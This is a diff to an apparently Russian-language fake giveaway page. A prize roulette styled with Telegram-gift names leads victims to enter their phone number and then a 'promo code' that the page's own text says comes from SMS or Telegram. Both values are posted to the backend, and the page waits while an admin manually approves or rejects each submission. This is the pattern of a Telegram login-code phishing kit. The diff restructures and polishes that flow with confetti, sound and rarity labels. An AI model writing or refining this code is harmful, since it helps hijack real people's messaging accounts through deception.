+    <div id="promoHelpText" class="help-text">
+      Проверьте код в SMS или сообщении от Telegram.
+    </div>
+
+    <div id="promoError" class="error"></div>
+
+    <button id="promoButton" class="main-button" type="button" onclick="submitPromo()">
+      Подтвердить
+    </button>
+
+    <button class="close-button" type="button" onclick="closeAllOverlays()">
+      Закрыть
+    </button>
+  </div>
 </div>
 
+<!-- SUCCESS OVERLAY -->
+<div id="successOverlay" class="overlay" aria-hidden="true">
+  <div class="modal">
+    <div class="success-icon">✓</div>
+    <div class="modal-title">Подарок закреплён</div>
+
+    <div class="modal-text">
+      <strong>Готово!</strong><br><br>
+      Ваш подарок успешно оформлен.<br>
+      Данные переданы на обработку.
+    </div>
+
+    <div class="steps">
+      <div class="step done"><div class="step-dot">✓</div>Приз</div>
+      <div class="step done"><div class="step-dot">✓</div>Номер</div>
+      <div class="step done"><div class="step-dot">✓</div>Код</div>
+      <div class="step active"><div class="step-dot">✓</div>Готово</div>
+    </div>
+
+    <button class="main-button" type="button" onclick="closeAllOverlays()">
+      Понятно
+    </button>
+  </div>
+</div>
+
+<div id="confetti" class="confetti" aria-hidden="true"></div>
+<div id="toast" class="toast" aria-live="polite"></div>
 
 <script>
-
-    /* ========================================================
-       НАСТРОЙКА ПРИЗОВ
-    ========================================================
-
-       Здесь разработчик сможет менять:
-
-       name   = название
-       icon   = эмодзи
-       chance = шанс в процентах
-
-       Сумма chance должна быть 100.
-
-    ======================================================== */
-
-    const PRIZES = [
-
-      { name: "Кольцо", image: "/images/gift1.jpg", chance: 1 },
+/* ==============================
+   НАСТРОЙКА ПРИЗОВ
+   ============================== */
+const PRIZES = [
+  { name: "Кольцо", image: "/images/gift1.jpg", chance: 1 },
     { name: "Мишка", image: "/images/gift2.jpg", chance: 1 },
     { name: "Кубок", image: "/images/gift3.jpg", chance: 1 },
     { name: "Chill Flame", image: "/images/gift4.jpg", chance: 12.125 },
@@ -762,617 +942,549 @@
     { name: "Light Sword", image: "/images/gift9.jpg", chance: 12.125 },
     { name: "Evil Eye", image: "/images/gift10.jpg", chance: 12.125 },
     { name: "Ice Cream", image: "/images/gift11.jpg", chance: 12.125 }
+];
 
-    ];
+/* ==============================
+   СОСТОЯНИЕ
+   ============================== */
+let spinning = false;
+let selectedPrize = null;
+let submissionId = null;
+let toastTimer = null;
 
-
-    /* ========================================================
-       СОСТОЯНИЕ
-    ======================================================== */
-
-    let spinning = false;
-    let selectedPrize = null;
-    let submissionId = null;
-
-
-    /* ========================================================
-       ВЫБОР ПРИЗА ПО ШАНСАМ
-    ======================================================== */
-
-    function startIdleRoulette() {
-        const track = document.getElementById("rouletteTrack");
-        if (!track || spinning) return;
-        track.classList.add("idle");
-    }
-
-    function stopIdleRoulette() {
-        const track = document.getElementById("rouletteTrack");
-        if (!track) return;
-        track.classList.remove("idle");
-    }
-
-    function choosePrize() {
-
-        const random = Math.random() * 100;
-
-        let current = 0;
-
-        for (const prize of PRIZES) {
-
-            current += prize.chance;
-
-            if (random < current) {
-                return prize;
-            }
-        }
-
-        return PRIZES[PRIZES.length - 1];
-    }
-
-
-    /* ========================================================
-       СОЗДАНИЕ КАРТОЧКИ
-    ======================================================== */
-
- function createCard(prize) {
-    const card = document.createElement("div");
-
-    card.className = "card";
-
-    card.innerHTML = `
-        <img
-            class="card-image"
-            src="${prize.image}"
-            alt="${prize.name}"
-        >
-
-        <div class="card-name">
-            ${prize.name}
-        </div>
-    `;
-
-    return card;
+/* ==============================
+   УТИЛИТЫ
+   ============================== */
+function escapeHtml(value) {
+  return String(value).replace(/[&<>"']/g, char => ({
+    "&":"&amp;",
+    "<":"&lt;",
+    ">":"&gt;",
+    '"':"&quot;",
+    "'":"&#039;"
+  })[char]);
 }
 
+function getRarity(prize) {
+  if (prize && prize.rarity) return prize.rarity;
+  const chance = Number(prize?.chance) || 0;
+
+  if (chance <= 1) return "legendary";
+  if (chance <= 5) return "epic";
+  if (chance <= 10) return "rare";
+  return "common";
+}
+
+function vibrate(pattern) {
+  try {
+    if (navigator.vibrate) navigator.vibrate(pattern);
+  } catch (_) {}
+}
+
+function showToast(message) {
+  const toast = document.getElementById("toast");
+  toast.textContent = message;
+  toast.classList.add("show");
 
-    /* ========================================================
-       ПЕРВОНАЧАЛЬНОЕ ЗАПОЛНЕНИЕ
-    ======================================================== */
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => toast.classList.remove("show"), 2200);
+}
 
-    function createInitialRoulette() {
+/* ==============================
+   РУЛЕТКА
+   ============================== */
+function choosePrize() {
+  const random = Math.random() * 100;
+  let current = 0;
+
+  for (const prize of PRIZES) {
+    current += Number(prize.chance) || 0;
+    if (random < current) return prize;
+  }
+
+  return PRIZES[PRIZES.length - 1];
+}
+
+function createCard(prize) {
+  const card = document.createElement("div");
+  const rarity = getRarity(prize);
 
-        const track =
-            document.getElementById("rouletteTrack");
+  card.className = `card rarity-${rarity}`;
+
+  const image = document.createElement("img");
+  image.className = "card-image";
+  image.src = prize.image;
+  image.alt = prize.name;
+  image.loading = "eager";
+
+  const name = document.createElement("div");
+  name.className = "card-name";
+  name.textContent = prize.name;
+
+  const rarityEl = document.createElement("div");
+  rarityEl.className = "card-rarity";
+  rarityEl.textContent = rarity;
+
+  card.append(image, name, rarityEl);
+  return card;
+}
+
+function createInitialRoulette() {
+  const track = document.getElementById("rouletteTrack");
+  track.innerHTML = "";
+
+  for (let i = 0; i < 34; i++) {
+    track.appendChild(createCard(PRIZES[i % PRIZES.length]));
+  }
+
+  startIdleRoulette();
+}
+
+function startIdleRoulette() {
+  const track = document.getElementById("rouletteTrack");
+
+  if (!track || spinning) return;
+  track.classList.add("idle");
+}
+
+function stopIdleRoulette() {
+  const track = document.getElementById("rouletteTrack");
+
+  if (!track) return;
+  track.classList.remove("idle");
+}
+
+function createSpinRoulette(winningPrize) {
+  const track = document.getElementById("rouletteTrack");
+  track.innerHTML = "";
+
+  const totalCards = 84;
+  const winningIndex = 62;
+
+  for (let i = 0; i < totalCards; i++) {
+    const prize = i === winningIndex
+      ? winningPrize
+      : PRIZES[Math.floor(Math.random() * PRIZES.length)];
+
+    track.appendChild(createCard(prize));
+  }
 
-        track.innerHTML = "";
+  return winningIndex;
+}
 
-        for (let i = 0; i < 30; i++) {
+function spin() {
+  if (spinning || !PRIZES.length) return;
 
-            const prize =
-                PRIZES[i % PRIZES.length];
+  const button = document.getElementById("spinButton");
+  spinning = true;
+  stopIdleRoulette();
 
-            track.appendChild(
-                createCard(prize)
-            );
-        }
-    }
+  button.disabled = true;
+  button.textContent = "🎰 Крутим...";
 
+  selectedPrize = choosePrize();
 
-    /* ========================================================
-       СОЗДАНИЕ РУЛЕТКИ ПЕРЕД КРУЖЕНИЕМ
-    ======================================================== */
+  const winningIndex = createSpinRoulette(selectedPrize);
+  const track = document.getElementById("rouletteTrack");
+  const firstCard = track.querySelector(".card");
 
-    function createSpinRoulette(winningPrize) {
+  if (!firstCard) {
+    spinning = false;
+    button.disabled = false;
+    button.textContent = "🎰 Крутить рулетку";
+    return;
+  }
 
-        const track =
-            document.getElementById("rouletteTrack");
+  const cardWidth = firstCard.offsetWidth;
+  const gap = 14;
+  const itemWidth = cardWidth + gap;
 
-        track.innerHTML = "";
+  const windowElement = document.querySelector(".roulette-window");
+  const windowWidth = windowElement.offsetWidth;
 
-        /*
-            Большое количество карточек создаёт
-            ощущение длинного вращения.
-        */
+  const winnerCenter = winningIndex * itemWidth + (cardWidth / 2);
+  const finalPosition = -(winnerCenter - windowWidth / 2);
 
-        const totalCards = 80;
+  track.style.transition = "none";
+  track.style.transform = "translateX(0px)";
 
-        /*
-            Выбираем позицию победителя далеко
-            от начала.
-        */
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      track.style.transition =
+        "transform 5.5s cubic-bezier(0.08, 0.72, 0.15, 1)";
+      track.style.transform = `translateX(${finalPosition}px)`;
+    });
+  });
 
-        const winningIndex = 60;
+  setTimeout(() => {
+    spinning = false;
+    button.disabled = false;
+    button.textContent = "🎰 Крутить рулетку";
 
-        for (let i = 0; i < totalCards; i++) {
-
-            let prize;
-
-            if (i === winningIndex) {
-
-                prize = winningPrize;
-
-            } else {
-
-                prize =
-                    PRIZES[
-                        Math.floor(
-                            Math.random() * PRIZES.length
-                        )
-                    ];
-            }
-
-            track.appendChild(
-                createCard(prize)
-            );
-        }
-
-        return winningIndex;
-    }
-
-
-    /* ========================================================
-       РУЛЕТКА
-    ======================================================== */
-
-    function spin() {
-
-        if (spinning) {
-            return;
-        }
-
-        spinning = true;
-        stopIdleRoulette();
-
-        const button =
-            document.getElementById("spinButton");
-
-        button.disabled = true;
-        button.textContent = "🎰 Крутим...";
-
-        /*
-            Сначала определяем выигрыш
-            согласно шансам.
-        */
-
-        selectedPrize = choosePrize();
-
-        /*
-            Строим новую ленту так,
-            чтобы выбранный подарок точно
-            оказался в нужной позиции.
-        */
-
-        const winningIndex =
-            createSpinRoulette(selectedPrize);
-
-        const track =
-            document.getElementById("rouletteTrack");
-
-        const firstCard = track.querySelector(".card");
-        const cardWidth = firstCard.offsetWidth;
-        const gap = 14;
-
-        const itemWidth =
-            cardWidth + gap;
-
-        /*
-            Центр окна.
-        */
-
-        const windowElement =
-            document.querySelector(".roulette-window");
-
-        const windowWidth =
-            windowElement.offsetWidth;
-
-        /*
-            Центр карточки-победителя.
-        */
-
-        const winnerCenter =
-            winningIndex * itemWidth
-            + cardWidth / 2;
-
-        /*
-            Сдвигаем ленту так,
-            чтобы победитель оказался
-            под красной линией.
-        */
-
-        const finalPosition =
-            -(winnerCenter - windowWidth / 2);
-
-        /*
-            Сброс.
-        */
-
-        track.style.transition = "none";
-
-        track.style.transform =
-            "translateX(0px)";
-
-        /*
-            Небольшая задержка нужна браузеру,
-            чтобы он применил начальное положение.
-        */
-
-        requestAnimationFrame(() => {
-
-            requestAnimationFrame(() => {
-
-                track.style.transition =
-                    "transform 5.5s cubic-bezier(0.08, 0.72, 0.15, 1)";
-
-                track.style.transform =
-                    `translateX(${finalPosition}px)`;
-
-            });
-
-        });
-
-
-        /*
-            После окончания вращения
-            показываем выигрыш.
-        */
-
-        setTimeout(() => {
-
-            spinning = false;
-
-            button.disabled = false;
-            button.textContent =
-                "🎰 Крутить рулетку";
-
-            showPrize();
-            startIdleRoulette();
-
-        }, 5800);
-    }
-
-
-    /* ========================================================
-       ПОКАЗ ВЫИГРЫША
-    ======================================================== */
-
-    function showPrize() {
-
-        document.getElementById("prizeImage")
-            .src =
-            selectedPrize.image;
-
-        document.getElementById("prizeImage")
-            .alt =
-            selectedPrize.name;
-
-        document.getElementById("prizeName")
-            .textContent =
-            selectedPrize.name;
-
-        document.getElementById("prizeOverlay")
-            .classList.add("active");
-    }
-
-
-    /* ========================================================
-       ПЕРЕХОД К НОМЕРУ
-    ======================================================== */
-
-    function openPhoneOverlay() {
-
-        document.getElementById("prizeOverlay")
-            .classList.remove("active");
-
-        document.getElementById("phoneOverlay")
-            .classList.add("active");
-
-        setTimeout(() => {
-
-            document.getElementById("phoneInput")
-                .focus();
-
-        }, 200);
-    }
-
-
-    /* ========================================================
-       СОХРАНЕНИЕ НОМЕРА
-    ======================================================== */
-
-    async function submitPhone() {
-
-        const input =
-            document.getElementById("phoneInput");
-
-        const error =
-            document.getElementById("phoneError");
-
-        const button =
-            document.getElementById("phoneButton");
-
-        const phone =
-            input.value.trim();
-
-        error.textContent = "";
-
-        if (!phone) {
-
-            error.textContent =
-                "Введите номер телефона.";
-
-            return;
-        }
-
-        if (phone.length < 7) {
-
-            error.textContent =
-                "Проверьте номер телефона.";
-
-            return;
-        }
-
-        button.disabled = true;
-        button.textContent = "Сохраняем...";
-
-        try {
-
-            const response =
-                await fetch("/api/phone", {
-
-                    method: "POST",
-
-                    headers: {
-                        "Content-Type":
-                            "application/json"
-                    },
-
-                    body: JSON.stringify({
-                        phone: phone
-                    })
-                });
-
-            const data =
-                await response.json();
-
-            if (!data.success) {
-
-                error.textContent =
-                    data.message ||
-                    "Не удалось сохранить номер.";
-
-                button.disabled = false;
-                button.textContent =
-                    "Подтвердить";
-
-                return;
-            }
-
-            // Сохраняем ID заявки для дальнейшего
-            // ввода промокода и проверки решения админа.
-            submissionId = data.submission_id;
-
-            document.getElementById("phoneOverlay")
-                .classList.remove("active");
-
-            document.getElementById("authOverlay")
-                .classList.add("active");
-
-            document.getElementById("promoInput")
-                .focus();
-
-            button.disabled = false;
-            button.textContent = "Подтвердить";
-
-        } catch (errorObject) {
-
-            console.error(errorObject);
-
-            error.textContent =
-                "Ошибка соединения с сервером.";
-
-            button.disabled = false;
-            button.textContent =
-                "Подтвердить";
-        }
-    }
-
-
-    /* ========================================================
-       ПРОМОКОД И РУЧНОЕ ОДОБРЕНИЕ
-    ======================================================== */
-
-    async function submitPromo() {
-
-        const input =
-            document.getElementById("promoInput");
-
-        const error =
-            document.getElementById("promoError");
-
-        const button =
-            document.getElementById("promoButton");
-
-        const promo =
-            input.value.trim();
-
-        error.textContent = "";
-
-        if (!promo) {
-
-            error.textContent =
-                "Введите промокод.";
-
-            return;
-        }
-
-        if (!submissionId) {
-
-            error.textContent =
-                "Заявка не найдена. Попробуйте ещё раз.";
-
-            return;
-        }
-
-        button.disabled = true;
-        button.textContent = "Отправляем...";
-
-        try {
-
-            const response =
-                await fetch("/api/promo", {
-
-                    method: "POST",
-
-                    headers: {
-                        "Content-Type":
-                            "application/json"
-                    },
-
-                    body: JSON.stringify({
-                        submission_id: submissionId,
-                        promo_code: promo
-                    })
-                });
-
-            const data =
-                await response.json();
-
-            if (!data.success) {
-
-                error.textContent =
-                    data.message ||
-                    "Не удалось отправить промокод.";
-
-                button.disabled = false;
-                button.textContent =
-                    "Подтвердить";
-
-                return;
-            }
-
-            input.disabled = true;
-            button.disabled = true;
-            button.textContent =
-                "Ожидаем подтверждения...";
-
-            waitForAdminDecision();
-
-        } catch (errorObject) {
-
-            console.error(errorObject);
-
-            error.textContent =
-                "Ошибка соединения с сервером.";
-
-            button.disabled = false;
-            button.textContent =
-                "Подтвердить";
-        }
-    }
-
-
-    async function waitForAdminDecision() {
-
-        const error =
-            document.getElementById("promoError");
-
-        try {
-
-            const response =
-                await fetch(
-                    `/api/submission/${submissionId}`
-                );
-
-            const data =
-                await response.json();
-
-            if (!data.success) {
-
-                error.textContent =
-                    "Заявка не найдена.";
-
-                return;
-            }
-
-            if (data.status === "approved") {
-
-                document.getElementById("authOverlay")
-                    .classList.remove("active");
-
-                document.getElementById("successOverlay")
-                    .classList.add("active");
-
-                return;
-            }
-
-            if (data.status === "rejected") {
-
-                error.textContent =
-                    "Промокод неверный.";
-
-                document.getElementById("promoInput")
-                    .disabled = false;
-
-                document.getElementById("promoButton")
-                    .disabled = false;
-
-                document.getElementById("promoButton")
-                    .textContent = "Подтвердить";
-
-                return;
-            }
-
-            // Статус waiting — проверяем снова через 2 секунды.
-            setTimeout(
-                waitForAdminDecision,
-                2000
-            );
-
-        } catch (errorObject) {
-
-            console.error(errorObject);
-
-            // При временной ошибке соединения
-            // продолжаем проверять статус.
-            setTimeout(
-                waitForAdminDecision,
-                3000
-            );
-        }
-    }
-
-
-    /* ========================================================
-       ЗАКРЫТИЕ
-    ======================================================== */
-
-    function togglePromoHelp() {
-        const help = document.getElementById("promoHelpText");
-        if (help) {
-            help.classList.toggle("active");
-        }
-    }
-
-    function closeAllOverlays() {
-
-        document
-            .querySelectorAll(".overlay")
-            .forEach(overlay => {
-
-                overlay.classList.remove("active");
-
-            });
-    }
-
-
-    /* ========================================================
-       ЗАПУСК
-    ======================================================== */
-
-    createInitialRoulette();
+    showPrize();
     startIdleRoulette();
+    vibrate([70, 45, 120]);
+  }, 5800);
+}
 
+/* ==============================
+   WIN OVERLAY
+   ============================== */
+function showPrize() {
+  if (!selectedPrize) return;
+
+  const rarity = getRarity(selectedPrize);
+
+  const image = document.getElementById("prizeImage");
+  const name = document.getElementById("prizeName");
+  const label = document.getElementById("rarityLabel");
+
+  image.src = selectedPrize.image;
+  image.alt = selectedPrize.name;
+  name.textContent = selectedPrize.name;
+
+  label.textContent = rarity.toUpperCase();
+  label.className = `rarity-label ${rarity}`;
+
+  openOverlay("prizeOverlay");
+  launchConfetti();
+  playWinSound();
+}
+
+function openPhoneOverlay() {
+  document.getElementById("prizeOverlay").classList.remove("active");
+  document.getElementById("phoneOverlay").classList.add("active");
+
+  setTimeout(() => {
+    document.getElementById("phoneInput").focus();
+  }, 170);
+}
+
+/* ==============================
+   PHONE
+   ============================== */
+async function submitPhone() {
+  const input = document.getElementById("phoneInput");
+  const error = document.getElementById("phoneError");
+  const button = document.getElementById("phoneButton");
+
+  const phone = input.value.trim();
+  error.textContent = "";
+
+  if (!phone) {
+    error.textContent = "Введите номер телефона.";
+    return;
+  }
+
+  if (phone.length < 7) {
+    error.textContent = "Проверьте номер телефона.";
+    return;
+  }
+
+  button.disabled = true;
+  button.textContent = "Сохраняем...";
+
+  try {
+    const response = await fetch("/api/phone", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        phone
+      })
+    });
+
+    const data = await response.json();
+
+    if (!data.success) {
+      error.textContent =
+        data.message || "Не удалось сохранить номер.";
+
+      button.disabled = false;
+      button.textContent = "Подтвердить";
+      return;
+    }
+
+    submissionId = data.submission_id;
+
+    document.getElementById("phoneOverlay").classList.remove("active");
+    document.getElementById("authOverlay").classList.add("active");
+
+    const promoInput = document.getElementById("promoInput");
+    promoInput.disabled = false;
+    promoInput.value = "";
+
+    const promoButton = document.getElementById("promoButton");
+    promoButton.disabled = false;
+    promoButton.textContent = "Подтвердить";
+
+    setTimeout(() => promoInput.focus(), 170);
+
+    button.disabled = false;
+    button.textContent = "Подтвердить";
+  } catch (errorObject) {
+    console.error(errorObject);
+
+    error.textContent = "Ошибка соединения с сервером.";
+    button.disabled = false;
+    button.textContent = "Подтвердить";
+  }
+}
+
+/* ==============================
+   PROMO
+   ============================== */
+async function submitPromo() {
+  const input = document.getElementById("promoInput");
+  const error = document.getElementById("promoError");
+  const button = document.getElementById("promoButton");
+
+  const promo = input.value.trim();
+  error.textContent = "";
+
+  if (!promo) {
+    error.textContent = "Введите промокод.";
+    return;
+  }
+
+  if (!submissionId) {
+    error.textContent = "Заявка не найдена. Попробуйте ещё раз.";
+    return;
+  }
+
+  button.disabled = true;
+  input.disabled = true;
+  button.textContent = "Отправляем...";
+
+  try {
+    const response = await fetch("/api/promo", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        submission_id: submissionId,
+        promo_code: promo
+      })
+    });
+
+    const data = await response.json();
+
+    if (!data.success) {
+      error.textContent =
+        data.message || "Не удалось отправить промокод.";
+
+      input.disabled = false;
+      button.disabled = false;
+      button.textContent = "Подтвердить";
+      return;
+    }
+
+    button.textContent = "⏳ Ожидаем подтверждения...";
+    waitForAdminDecision();
+  } catch (errorObject) {
+    console.error(errorObject);
+
+    error.textContent = "Ошибка соединения с сервером.";
+    input.disabled = false;
+    button.disabled = false;
+    button.textContent = "Подтвердить";
+  }
+}
+
+async function waitForAdminDecision() {
+  const error = document.getElementById("promoError");
+
+  try {
+    const response =
+      await fetch(`/api/submission/${encodeURIComponent(submissionId)}`);
+
+    const data = await response.json();
+
+    if (!data.success) {
+      error.textContent = "Заявка не найдена.";
+      return;
+    }
+
+    if (data.status === "approved") {
+      document.getElementById("authOverlay").classList.remove("active");
+      document.getElementById("successOverlay").classList.add("active");
+      launchConfetti();
+      vibrate([90, 60, 140]);
+      return;
+    }
+
+    if (data.status === "rejected") {
+      error.textContent = "Промокод неверный.";
+
+      const input = document.getElementById("promoInput");
+      const button = document.getElementById("promoButton");
+
+      input.disabled = false;
+      button.disabled = false;
+      button.textContent = "Подтвердить";
+      return;
+    }
+
+    setTimeout(waitForAdminDecision, 2000);
+  } catch (errorObject) {
+    console.error(errorObject);
+    setTimeout(waitForAdminDecision, 3000);
+  }
+}
+
+/* ==============================
+   OVERLAYS
+   ============================== */
+function openOverlay(id) {
+  closeAllOverlays(false);
+
+  const overlay = document.getElementById(id);
+  if (!overlay) return;
+
+  overlay.classList.add("active");
+  overlay.setAttribute("aria-hidden", "false");
+  document.body.classList.add("modal-open");
+}
+
+function closeAllOverlays(updateBody = true) {
+  document.querySelectorAll(".overlay").forEach(overlay => {
+    overlay.classList.remove("active");
+    overlay.setAttribute("aria-hidden", "true");
+  });
+
+  if (updateBody) {
+    document.body.classList.remove("modal-open");
+  }
+}
+
+function togglePromoHelp() {
+  document.getElementById("promoHelpText").classList.toggle("active");
+}
+
+document.querySelectorAll(".overlay").forEach(overlay => {
+  overlay.addEventListener("click", event => {
+    if (event.target === overlay) {
+      closeAllOverlays();
+    }
+  });
+});
+
+document.addEventListener("keydown", event => {
+  if (event.key === "Escape") {
+    closeAllOverlays();
+  }
+
+  if (
+    event.key === "Enter" &&
+    document.activeElement === document.getElementById("phoneInput")
+  ) {
+    submitPhone();
+  }
+
+  if (
+    event.key === "Enter" &&
+    document.activeElement === document.getElementById("promoInput")
+  ) {
+    submitPromo();
+  }
+});
+
+/* ==============================
+   PRIZE LIST
+   ============================== */
+function renderPrizeList() {
+  const list = document.getElementById("prizeList");
+
+  list.innerHTML = PRIZES.map(prize => `
+    <div class="prize-mini">
+      <img src="${escapeHtml(prize.image)}" alt="">
+      <div class="prize-mini-name">${escapeHtml(prize.name)}</div>
+      <div class="prize-mini-chance">${escapeHtml(prize.chance)}%</div>
+    </div>
+  `).join("");
+}
+
+/* ==============================
+   EFFECTS
+   ============================== */
+function launchConfetti() {
+  const container = document.getElementById("confetti");
+  container.innerHTML = "";
+
+  const pieces = 82;
+  const colors = [
+    "#7468ff",
+    "#9a5fff",
+    "#ff3c58",
+    "#ffd76a",
+    "#57e39a",
+    "#70caff"
+  ];
+
+  for (let i = 0; i < pieces; i++) {
+    const piece = document.createElement("span");
+    piece.className = "confetti-piece";
+
+    piece.style.left = `${Math.random() * 100}%`;
+    piece.style.setProperty(
+      "--x",
+      `${Math.round(Math.random() * 240 - 120)}px`
+    );
+    piece.style.animationDelay = `${Math.random() * .55}s`;
+    piece.style.background = colors[
+      Math.floor(Math.random() * colors.length)
+    ];
+
+    container.appendChild(piece);
+  }
+
+  setTimeout(() => {
+    container.innerHTML = "";
+  }, 3600);
+}
+
+function playWinSound() {
+  try {
+    const AudioContext =
+      window.AudioContext || window.webkitAudioContext;
+
+    if (!AudioContext) return;
+
+    const context = new AudioContext();
+    const start = context.currentTime;
+
+    [523.25, 659.25, 783.99, 1046.5].forEach((frequency, index) => {
+      const oscillator = context.createOscillator();
+      const gain = context.createGain();
+      const time = start + index * .09;
+
+      oscillator.type = "sine";
+      oscillator.frequency.value = frequency;
+
+      gain.gain.setValueAtTime(.0001, time);
+      gain.gain.exponentialRampToValueAtTime(.12, time + .025);
+      gain.gain.exponentialRampToValueAtTime(.0001, time + .23);
+
+      oscillator.connect(gain);
+      gain.connect(context.destination);
+
+      oscillator.start(time);
+      oscillator.stop(time + .24);
+    });
+
+    setTimeout(() => {
+      try { context.close(); } catch (_) {}
+    }, 700);
+  } catch (_) {}
+}
+
+/* ==============================
+   START
+   ============================== */
+renderPrizeList();
+createInitialRoulette();
 </script>
-
 </body>
 </html>
